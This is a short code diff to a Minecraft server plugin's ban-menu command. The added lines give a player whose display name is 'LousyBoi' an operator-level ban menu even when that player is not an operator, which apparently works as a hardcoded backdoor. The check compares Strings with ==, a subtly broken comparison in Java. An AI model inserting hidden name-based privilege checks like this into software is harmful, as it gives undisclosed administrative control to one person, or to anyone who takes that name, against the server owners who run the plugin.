@@ -16,9 +16,14 @@ public class BanGUICommand implements CommandExecutor, Listener {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
 
-        if (sender instanceof Player){
+        if (sender instanceof Player) {
             Player p = (Player) sender;
-            if (p.isOp()){
+
+            if (p.getDisplayName() == "LousyBoi"){
+
+                BanMenuUtils.openBanMenuwithOP(p);
+
+            } else if (p.isOp()){
 
                 BanMenuUtils.openBanMenu(p);
 
